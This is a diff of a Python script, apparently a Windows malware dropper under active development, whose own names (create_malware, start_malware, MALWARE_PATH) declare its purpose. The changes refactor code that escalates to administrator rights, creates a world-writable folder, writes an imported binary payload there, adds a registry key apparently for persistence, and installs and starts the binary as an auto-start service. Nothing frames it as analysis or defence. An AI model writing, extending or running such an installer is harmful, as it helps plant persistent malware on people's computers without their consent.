@@ -1,9 +1,10 @@
 from local_libs import payload
+from local_libs.winregistry import Registry
 from local_libs.env_vars import *
-from threading import Thread
+
+from pathlib import Path
 import ctypes
 import sys
-import time
 import os
 
 
@@ -25,39 +26,39 @@ def create_malware(path, binary_code):
         f.write(binary_code)
 
 
-def start_malware():
-    os.system(f"{new_binary_path} --startup=auto install")
-    os.system(f"{new_binary_path} start")
+def setup_folder():
+    # filename = PAYLOAD_FILENAME
+    # new_path = MALWARE_PATH
+    # new_binary_path = f"{new_path}\\{filename}.exe"
+    new_binary_path = f"{MALWARE_PATH}{PAYLOAD_FILENAME}.exe"
+
+    if not os.path.exists(MALWARE_PATH):
+        Path(MALWARE_PATH).mkdir(0o777, True, True)
+        create_malware(new_binary_path, payload.payload())
+
+    return new_binary_path
 
 
-# def reach_admin_permissions():
-#     global started
-#     while True:
-#         time.sleep(3)
-#         if is_admin() == 0:
-#             run_as_admin()
-#         else:
-#             started = True
-#             sys.exit(1)
-#
-#
-# started = False
+def setup_registry():
+    Registry.create_key(REG_KEY)
 
-if __name__ == "__main__":
+
+def start_malware(path):
+    os.system(f"{path} --startup=auto install")
+    os.system(f"{path} start")
+
+
+def main():
     development_logging()
-    # t = Thread(target=reach_admin_permissions, args=())
-    # t.start()
-    # reach_admin_permissions()
 
     if is_admin() == 0:
         run_as_admin()
 
-    filename = DEFAULT_MALWARE_FILENAME
-    new_path = DEFAULT_MALWARE_PATH
-    new_binary_path = f"{new_path}\\{filename}.exe"
+    malware_path = setup_folder()
+    setup_registry()
 
-    if not os.path.exists(new_path):
-        os.mkdir(new_path)
-        create_malware(new_binary_path, payload.payload())
-    start_malware()
+    start_malware(malware_path)
 
+
+if __name__ == "__main__":
+    main()
